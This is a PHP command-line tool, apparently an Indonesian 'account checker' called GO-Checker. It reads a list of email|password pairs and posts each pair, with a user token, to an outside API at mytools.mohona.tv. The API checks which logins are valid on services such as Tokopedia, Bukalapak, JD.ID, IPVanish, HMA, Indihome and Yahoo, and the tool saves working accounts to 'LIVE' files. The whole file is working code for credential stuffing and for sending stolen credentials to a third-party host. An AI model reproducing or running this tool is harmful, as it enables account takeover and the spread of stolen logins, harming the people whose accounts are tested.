<?php 
	/*
		GO-Checker
		Author : Minicode ft. Brilly4n
		{ IndoSec }
		Contact : https://facebook.com/IndoSecOfficial
	*/

	/*
		Jangan Di Utak Atik kalo gk mau error gan :)
	*/

	$version = '1.1.1';

	// error_reporting(0);
	if (!file_exists('token.php')) {
		echo "\n\n[-] SILAHKAN ISI TOKEN DAHULU, DENGAN MENGETIKAN SEPERTI DI BAWAH INI\n[+] php set.php YOUR_TOKEN\n\n";
		exit();
	}
	
	require('token.php');
	
	// Cek Token
	if ($token == "") {
		echo "\n\n[-] TIDAK ADA TOKEN, SILAHKAN CHAT KAMI DI FANSPAGE INDOSEC [-]\n[+] https://fb.com/IndoSecOfficial\n\n";
		exit();
	}

	// Cek Version
	function cek_version($version)
	{
		$versis = file_get_contents('version.txt');
		$versi = explode("\r", $versis);
		if ($versi[0] != $version) {
			echo "\n\n[+] Update Gan versi ke $versi[0]... git clone https://github.com/indosecid/go-checker\n\n";
			exit();
		}
	}

	cek_version($version);
	
	// SERVER
	$server = "http://mytools.mohona.tv/Api/";

	function banner()
	{
		echo "
 _____             _____      _             
|  __ \           /  __ \    | |            
| |  \/ ___ ______| /  \/ ___| | _____ _ __ 
| | __ / _ \______| |    / _ \ |/ / _ \ '__|
| |_\ \ (_) |     | \__/\  __/   <  __/ |   
 \____/\___/       \____/\___|_|\_\___|_|  v.1.1

 https://www.facebook.com/IndoSecOfficial
";
	}

	function post_api($server, $data, $api, $file_txt, $die_txt)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $server.$api);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		$x = curl_exec($ch);
		curl_close($ch);
		$result = json_decode($x);
		if ($result->status == 'success') {
			$o = fopen($file_txt, 'a');
			fwrite($o, $result->data);
			fclose($o);
			echo $result->data;
		}elseif($result->status == 'error'){
			$o = fopen($die_txt, 'a');
			fwrite($o, $result->data);
			fclose($o);
			echo $result->data;
		}else{
			echo $x;
			exit();
		}
	}
	function post($pilihan, $email, $pass, $token, $server, $file_txt, $die_txt)
	{	
		$data = "email=$email&pass=$pass&token=$token";

		

		if ($pilihan == 2) {
			post_api($server, $data, 'bl', $file_txt, $die_txt);
		}elseif($pilihan == 1){
			post_api($server, $data, 'phd', $file_txt, $die_txt);
		}elseif($pilihan == 3){
			post_api($server, $data, 'tokopedia', $file_txt, $die_txt);
		}elseif($pilihan == 4){
			post_api($server, $data, 'jdid', $file_txt, $die_txt);
		}elseif($pilihan == 5){
			post_api($server, $data, 'ipvanish', $file_txt, $die_txt);
		}elseif($pilihan == 6){
			post_api($server, $data, 'hma', $file_txt, $die_txt);
		}elseif($pilihan == 7){
			post_api($server, $data, 'indihome', $file_txt, $die_txt);
		}elseif($pilihan == 20){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'yahoo');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}
			sleep(1);
		}
	}

	function pilihan()
	{
		echo "\n[+] (1).PHD (2).Bukalapak (3).Tokopedia (4) JD.ID";
		echo "\n[+] (5).IpVanish (6).HMA (7).Indihome";
		echo "\n[+] (20).Yahoo Valid Email \n";
		echo "\n[+] (99). Mass Hashing (Ultra Hash) \n\n";
	}

	banner();
	pilihan();

	echo " > Masukan Pilihan Checker : ";
	$pilihan = trim(fgets(STDIN));

	if ($pilihan == 6) {
		echo "\n[+] Example list : CWHKLB-U73H82-5KU7M1\n";
	}elseif($pilihan == 99){
		echo "\n[+] Example list : email|pass\n[+] Support Semua Hash\n";
	}

	echo "\n > Masukan List.txt : ";
	$list = trim(fgets(STDIN));
	
	echo "\n[+] Loading....\n\n";

	if (file_exists($list)) {

		$files = file_get_contents($list);
		$file = explode("\r\n", $files);

		if ($pilihan == 99) {
			require('bin/hashit.php');
			touch('bin/result.txt');
			$file = file_get_contents($list);
			$files = explode("\n", $file);
			foreach ($files as $key) {
				
				$pass = explode("|", $key);
				$panjang = strlen($pass[0]);
				
				hashit($pass[0], $pass[1]);
			
			}
			echo "\n\n";
			exit();
		}

		$rand = date('dmY_His');
		if ($pilihan == 2) {

			$file_txt = 'BL_LIVE_'.$rand.'.txt';
			$die_txt = 'BL_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 1){

			$file_txt = 'PHD_LIVE_'.$rand.'.txt';
			$die_txt = 'PHD_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 3){

			$file_txt = 'TOKPED_LIVE_'.$rand.'.txt';
			$die_txt = 'TOKPED_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 4){

			$file_txt = 'JDID_LIVE_'.$rand.'.txt';
			$die_txt = 'JDID_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 5){

			$file_txt = 'IPVANISH_LIVE_'.$rand.'.txt';
			$die_txt = 'IPVANISH_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 6){

			$file_txt = 'HMA_LIVE_'.$rand.'.txt';
			$die_txt = 'HMA_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 7){

			$file_txt = 'INDIHOME_LIVE_'.$rand.'.txt';
			$die_txt = 'INDIHOME_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 20){

			$file_txt = 'YAHOO_LIVE_'.$rand.'.txt';
			$die_txt = 'YAHOO_DIE_'.$rand.'.txt';	
		}

		
		echo "\n[+] Your ID : ".$rand." \n[+] File $file_txt | $die_txt Created !\n\n";

		$open = touch($file_txt);

		foreach ($file as $key) {
			
			$user = explode("|", $key);

			post($pilihan, $user[0], $user[1], $token, $server, $file_txt, $die_txt);
		}
	}else{
		echo "\n[-] FILE TIDAK ADA \n\n";
		exit();
	}

?>